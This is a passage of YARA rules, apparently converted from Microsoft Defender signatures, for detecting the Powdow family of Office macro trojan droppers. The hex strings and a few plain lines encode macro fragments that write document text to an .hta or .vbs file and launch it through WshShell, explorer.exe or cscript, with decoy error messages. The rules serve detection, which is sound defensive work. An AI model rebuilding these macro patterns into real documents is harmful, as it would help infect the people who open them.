        $x_1_2 = {53 65 74 20 [0-32] 20 3d 20 4e 65 77 20 49 57 73 68 52 75 6e 74 69 6d 65 4c 69 62 72 61 72 79 2e 57 73 68 53 68 65 6c 6c [0-32] 2e 65 78 65 63 20 22 65 78 70 6c 6f 72 65 72 20 22 20 2b 20 [0-21] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_3 = {53 75 62 20 64 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 02 00 69 6e 69 74 20 22 31 2e 68 74 61 22 2c 20 52 65 70 6c 61 63 65 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 2c 20 22 [0-8] 22 2c 20 22 22 29 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_BZLF_2147793014_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.BZLF!MTB"
        threat_id = "2147793014"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 74 74 72 69 62 75 74 65 20 56 42 5f 4e 61 6d 65 20 3d 20 22 [0-32] 22 02 00 53 75 62 20 69 28 [0-16] 2c 20 [0-16] 29 02 00 4f 70 65 6e 20 [0-32] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31 02 00 50 72 69 6e 74 20 23 31 2c 20 [0-64] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = {53 65 74 20 [0-32] 20 3d 20 4e 65 77 20 49 57 73 68 52 75 6e 74 69 6d 65 4c 69 62 72 61 72 79 2e 57 73 68 53 68 65 6c 6c [0-32] 2e 65 78 65 63 20 22 63 3a 5c 5c 77 69 6e 64 6f 77 73 5c 5c 65 78 70 6c 6f 72 65 72 20 22 20 2b 20 [0-32] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_3 = {53 75 62 20 64 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 02 00 43 61 6c 6c 20 69 28 22 31 2e 68 74 61 22 2c 20 52 65 70 6c 61 63 65 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 2c 20 22 [0-8] 22 2c 20 22 22 29 29 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_BZLG_2147793092_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.BZLG!MTB"
        threat_id = "2147793092"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 74 74 72 69 62 75 74 65 20 56 42 5f 4e 61 6d 65 20 3d 20 22 [0-32] 22 02 00 53 75 62 20 78 79 7a 28 [0-16] 2c 20 [0-16] 29 02 00 4f 70 65 6e 20 [0-32] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31 02 00 50 72 69 6e 74 20 23 31 2c 20 [0-69] 22 65 78 70 6c 6f 22 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = {53 65 74 20 [0-32] 20 3d 20 4e 65 77 20 49 57 73 68 52 75 6e 74 69 6d 65 4c 69 62 72 61 72 79 2e 57 73 68 53 68 65 6c 6c [0-32] 2e 65 78 65 63 20 22 63 3a 5c 5c 2e 2e 5c 5c 2e 2e 5c 5c 2e 2e 5c 5c 77 69 6e 64 6f 77 73 5c 5c 22 20 2b 20 [0-32] 20 2b 20 22 72 65 72 20 22 20 2b 20 [0-32] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_3 = {53 75 62 20 64 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 02 00 43 61 6c 6c 20 78 79 7a 28 22 31 2e 68 74 61 22 2c 20 52 65 70 6c 61 63 65 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 2c 20 22 5e 29 22 2c 20 22 22 29 29 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_BZLH_2147793679_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.BZLH!MTB"
        threat_id = "2147793679"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 75 62 20 64 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 02 00 58 52 20 22 [0-32] 2e 68 22 2c 20 22 22 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = {41 74 74 72 69 62 75 74 65 20 56 42 5f 4e 61 6d 65 20 3d 20 22 [0-16] 22 02 00 53 75 62 20 58 52 28 [0-32] 2c 20 [0-32] 29 02 00 4f 70 65 6e 20 [0-32] 20 26 20 22 74 61 22 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31 02 00 50 72 69 6e 74 20 23 31 2c 20 52 65 70 6c 61 63 65 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 52 61 6e 67 65 2e 54 65 78 74 2c 20 22 23 2d 22 2c 20 22 22 29 02 00 43 6c 6f 73 65 20 23 31}  //weight: 1, accuracy: Low
        $x_1_3 = {22 65 78 70 6c 22 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 4e 65 77 20 49 57 73 68 52 75 6e 74 69 6d 65 4c 69 62 72 61 72 79 2e 57 73 68 53 68 65 6c 6c 02 00 57 69 74 68 20 [0-32] 2e 65 78 65 63 20 22 63 3a 5c 5c 2e 2e 5c 5c 2e 2e 5c 5c 2e 2e 5c 5c 77 69 6e 64 6f 77 73 5c 5c 22 20 2b 20 [0-32] 20 2b 20 22 6f 72 65 72 20 22 20 2b 20 [0-32] 20 26 20 22 74 61 22 02 00 45 6e 64 20 57 69 74 68 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_BZLI_2147793803_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.BZLI!MTB"
        threat_id = "2147793803"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 75 62 20 64 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 02 00 58 52 20 22 [0-32] 2e 68 22 2c 20 22 22 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = {41 74 74 72 69 62 75 74 65 20 56 42 5f 4e 61 6d 65 20 3d 20 22 [0-16] 22 02 00 53 75 62 20 58 52 28 [0-32] 2c 20 [0-32] 29 02 00 4f 70 65 6e 20 [0-32] 20 26 20 22 74 61 22 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31 02 00 50 72 69 6e 74 20 23 31 2c 20 52 65 70 6c 61 63 65 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 52 61 6e 67 65 2e 54 65 78 74 2c 20 22 23 2d 22 2c 20 22 22 29 02 00 43 6c 6f 73 65 20 23 31}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 4e 65 77 20 49 57 73 68 52 75 6e 74 69 6d 65 4c 69 62 72 61 72 79 2e 57 73 68 53 68 65 6c 6c 02 00 57 69 74 68 20 [0-32] 2e 65 78 65 63 20 [0-32] 20 2b 20 22 6c 6f 72 65 72 20 22 20 2b 20 [0-32] 20 26 20 22 74 61 22 02 00 45 6e 64 20 57 69 74 68 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_BZLJ_2147793942_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.BZLJ!MTB"
        threat_id = "2147793942"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 75 62 20 64 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 02 00 58 52 20 22 [0-32] 2e 68 74 22 2c 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 52 61 6e 67 65 2e 54 65 78 74 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = {41 74 74 72 69 62 75 74 65 20 56 42 5f 4e 61 6d 65 20 3d 20 22 [0-16] 22 02 00 53 75 62 20 58 52 28 [0-32] 2c 20 [0-32] 29 02 00 4f 70 65 6e 20 [0-32] 20 26 20 22 61 22 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31 02 00 50 72 69 6e 74 20 23 31 2c 20 52 65 70 6c 61 63 65 28 [0-48] 2c 20 22 23 2d 22 2c 20 22 22 29 02 00 43 6c 6f 73 65 20 23 31}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 4e 65 77 20 49 57 73 68 52 75 6e 74 69 6d 65 4c 69 62 72 61 72 79 2e 57 73 68 53 68 65 6c 6c 02 00 57 69 74 68 20 [0-32] 2e 65 78 65 63 20 [0-32] 20 2b 20 22 6c 6f 72 65 72 20 22 20 2b 20 [0-32] 20 26 20 22 61 22 02 00 45 6e 64 20 57 69 74 68 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_BZLK_2147794019_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.BZLK!MTB"
        threat_id = "2147794019"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 75 62 20 64 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 02 00 58 52 20 22 [0-32] 2e 68 74 22 2c 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = {41 74 74 72 69 62 75 74 65 20 56 42 5f 4e 61 6d 65 20 3d 20 22 [0-16] 22 02 00 53 75 62 20 58 52 28 [0-32] 2c 20 [0-32] 29 02 00 4f 70 65 6e 20 [0-32] 20 26 20 22 61 22 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31 02 00 50 72 69 6e 74 20 23 31 2c 20 52 65 70 6c 61 63 65 28 [0-48] 2c 20 22 26 31 22 2c 20 22 22 29 02 00 43 6c 6f 73 65 20 23 31}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 4e 65 77 20 49 57 73 68 52 75 6e 74 69 6d 65 4c 69 62 72 61 72 79 2e 57 73 68 53 68 65 6c 6c 02 00 57 69 74 68 20 [0-32] 2e 65 78 65 63 20 [0-32] 20 2b 20 22 72 65 72 2e 65 78 65 20 22 20 2b 20 [0-32] 20 26 20 22 61 22 02 00 45 6e 64 20 57 69 74 68 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_BVBA_2147794082_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.BVBA!MTB"
        threat_id = "2147794082"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 74 74 72 69 62 75 74 65 20 56 42 5f 4e 61 6d 65 20 3d 20 22 [0-16] 22 02 00 53 75 62 20 65 46 69 6c 65 28 29 02 00 44 69 6d 20 51 51 31 20 41 73 20 4f 62 6a 65 63 74 02 00 53 65 74 20 51 51 31 20 3d 20 4e 65 77 20 46 6f 72 6d 02 00 52 4f 20 3d 20 22 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 22 02 00 52 4f 49 20 3d 20 52 4f 20 2b 20 22 70 69 6e 2e 76 62 73 22 02 00 69 69 20 3d 20 22 22}  //weight: 1, accuracy: Low
        $x_1_2 = {4e 65 20 3d 20 22 49 5a 49 4d 49 5a 49 4f 5a 49 22 02 00 57 57 20 3d 20 51 51 31 2e 74 32 2e 43 61 70 74 69 6f 6e 02 00 4d 79 46 69 6c 65 20 3d 20 46 72 65 65 46 69 6c 65}  //weight: 1, accuracy: Low
        $x_1_3 = "fun = Shell(\"cmd /k cscript.exe C:\\ProgramData\\pin.vbs\", Chr(48))" ascii //weight: 1
        $x_1_4 = {27 52 65 73 75 6c 74 20 3d 20 4d 73 67 42 6f 78 28 22 20 20 54 68 65 20 64 6f 63 75 6d 65 6e 74 20 63 61 6e 6e 6f 74 20 62 65 20 64 65 63 72 79 70 74 65 64 2e 20 22 2c 20 76 62 41 62 6f 72 74 52 65 74 72 79 49 67 6e 6f 72 65 20 2b 20 76 62 43 72 69 74 69 63 61 6c 2c 20 22 20 20 45 72 72 6f 72 20 20 20 30 78 63 30 30 30 30 31 34 32 20 20 20 22 29 02 00 45 6e 64 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_5 = {53 75 62 20 41 75 74 6f 4f 70 65 6e 28 29 02 00 62 78 68 2e 65 46 69 6c 65 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_6 = "sSplit = Split(UCase$(Trim$(Email)), \".\")" ascii //weight: 1
        $x_1_7 = "Get #refFile, , tmpByte4" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_BZLP_2147794462_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.BZLP!MTB"
        threat_id = "2147794462"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 20 22 61 22 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31 02 00 50 72 69 6e 74 20 23 31 2c 20 56 42 41 24 2e 52 65 70 6c 61 63 65 28 [0-32] 2c 20 22 26 31 22 2c 20 22 22 29 02 00 43 6c 6f 73 65 20 23 31 [0-64] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 4e 65 77 20 49 57 73 68 52 75 6e 74 69 6d 65 4c 69 62 72 61 72 79 2e 57 73 68 53 68 65 6c 6c 02 00 57 69 74 68 20 [0-32] 2e 72 75 6e 20 [0-32] 20 26 20 22 61 22 02 00 45 6e 64 20 57 69 74 68 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_3 = {53 75 62 20 64 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 02 00 52 20 22 [0-32] 2e 68 74 22 2c 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_BZLT_2147794650_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.BZLT!MTB"
        threat_id = "2147794650"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 4e 65 77 20 49 57 73 68 52 75 6e 74 69 6d 65 4c 69 62 72 61 72 79 2e 57 73 68 53 68 65 6c 6c [0-32] 2e 72 75 6e 20 [0-32] 20 26 20 22 74 61 22 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = {53 75 62 20 64 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 02 00 64 73 20 22 [0-32] 2e 68 22 2c 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-32] 20 26 20 22 54 61 22 29 [0-32] 2e 57 72 69 74 65 4c 69 6e 65 20 56 42 41 2e 52 65 70 6c 61 63 65 24 28 [0-32] 2c 20 22 26 31 22 2c 20 22 22 29 [0-32] 2e 43 6c 6f 73 65 02 00 53 65 74 [0-32] 20 3d 20 4e 6f 74 68 69 6e 67 02 00 53 65 74 20 [0-32] 20 3d 20 4e 6f 74 68 69 6e 67 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_BZLY_2147794692_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.BZLY!MTB"
        threat_id = "2147794692"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 4e 65 77 20 49 57 73 68 52 75 6e 74 69 6d 65 4c 69 62 72 61 72 79 2e 57 73 68 53 68 65 6c 6c 02 00 57 69 74 68 20 [0-48] 2e 72 75 6e 20 [0-32] 20 26 20 22 61 22 02 00 45 6e 64 20 57 69 74 68 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = {53 75 62 20 64 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 02 00 58 52 20 22 [0-32] 2e 68 74 22 2c 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_3 = {26 20 22 61 22 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31 02 00 50 72 69 6e 74 20 23 31 2c 20 52 65 70 6c 61 63 65 28 [0-32] 2c 20 22 26 31 22 2c 20 22 22 29 02 00 43 6c 6f 73 65 20 23 31 [0-64] 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_BZLY_2147794692_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.BZLY!MTB"
        threat_id = "2147794692"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {46 75 6e 63 74 69 6f 6e 20 74 65 78 74 31 28 [0-32] 29 [0-32] 20 3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 42 75 69 6c 74 49 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 [0-32] 29 2e 56 61 6c 75 65 02 00 63 6f 6e 74 65 6e 74 73 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_2 = {50 75 62 6c 69 63 20 46 75 6e 63 74 69 6f 6e 20 73 28 [0-32] 29 02 00 47 65 74 4f 62 6a 65 63 74 28 22 22 2c 20 22 77 73 63 72 69 70 74 2e 73 68 65 6c 6c 22 29 2e 65 78 65 63 20 74 65 78 74 31 28 22 63 61 74 65 67 6f 72 79 22 29 20 2b 20 22 20 22 20 2b 20 [0-32] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_3 = {53 74 72 52 65 76 65 72 73 65 28 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 74 65 78 74 31 28 22 6b 65 79 77 6f 72 64 73 22 29 29 02 00 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 61 76 65 41 73 32 20 46 69 6c 65 4e 61 6d 65 3a 3d [0-32] 2c 20 [0-32] 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 73}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_BZLZ_2147794840_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.BZLZ!MTB"
        threat_id = "2147794840"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {50 75 62 6c 69 63 20 53 75 62 20 77 6f 72 64 45 78 63 65 6c 28 [0-32] 29 02 00 4f 70 65 6e 20 [0-32] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31 02 00 50 72 69 6e 74 20 23 31 2c 20 52 65 70 6c 61 63 65 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 52 61 6e 67 65 2e 54 65 78 74 2c 20 22 26 6c 74 3b 22 2c 20 22 22 29 02 00 43 6c 6f 73 65 20 23 31 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 4e 65 77 20 57 73 68 53 68 65 6c 6c [0-32] 2e 72 75 6e 20 [0-32] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_3 = {53 75 62 20 64 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 02 00 43 61 6c 6c 20 73 28 22 [0-32] 22 29 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 77 6f 72 64 45 78 63 65 6c 20 [0-32] 20 26 20 22 2e 2e 2e 68 54 61 22 [0-32] 2e 65 61 72 74 68 57 69 6e 64 6f 77 73 20 [0-32] 20 26 20 22 2e 2e 2e 68 54 61 22 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_BTRA_2147795279_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.BTRA!MTB"
        threat_id = "2147795279"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {50 75 62 6c 69 63 20 53 75 62 20 [0-32] 28 [0-32] 2c 20 [0-32] 29 02 00 4f 70 65 6e 20 22 22 20 26 20 [0-32] 20 26 20 22 22 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31 02 00 50 72 69 6e 74 20 23 31 2c 20 [0-32] 43 6c 6f 73 65 20 23 31 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 4e 65 77 20 57 73 68 53 68 65 6c 6c [0-32] 2e 72 75 6e 20 [0-32] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_3 = {26 20 22 2e 2e 2e 2e 2e 68 74 61 2e 22 2c 20 52 65 70 6c 61 63 65 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 52 61 6e 67 65 2e 54 65 78 74 2c 20 22 26 6c 74 3b 22 2c 20 22 22 29 [0-32] 2e [0-32] 20 [0-32] 20 26 20 22 2e 2e 2e 2e 2e 68 74 61 2e 22 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_BTCB_2147795985_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.BTCB!MTB"
        threat_id = "2147795985"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 [0-48] 20 3d 20 6d 61 69 6e 2e 72 28 22 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c [0-32] 2e 68 22 29 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = {53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 [0-48] 20 3d 20 6d 61 69 6e 2e 72 28 22 63 3a 5c 75 73 65 72 73 5c 70 75 62 6c 69 63 5c [0-32] 2e 68 74 22 29 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_3 = {41 74 74 72 69 62 75 74 65 20 56 42 5f 4e 61 6d 65 20 3d 20 22 6d 61 69 6e 22 02 00 50 75 62 6c 69 63 20 46 75 6e 63 74 69 6f 6e 20 72 28 [0-32] 29 [0-32] 3d 20 [0-32] 20 26 20 22 [0-1] 61 22}  //weight: 1, accuracy: Low
        $x_1_4 = "msgbox \"Error has occurred: External table is not in the expected format.\", 16, \"Microsoft Word\"" ascii //weight: 1
        $x_1_5 = "ActiveDocument.Content.Find.Execute FindText:=\"%_\", ReplaceWith:=\"\", Replace:=wdReplaceAll" ascii //weight: 1
        $x_1_6 = {3d 20 4e 65 77 20 57 73 68 53 68 65 6c 6c [0-32] 2e 72 75 6e 20 [0-32] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDropper_O97M_Powdow_BTCC_2147796761_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.BTCC!MTB"
        threat_id = "2147796761"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 4e 65 77 20 57 73 68 53 68 65 6c 6c [0-32] 2e 72 75 6e 20 [0-32] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
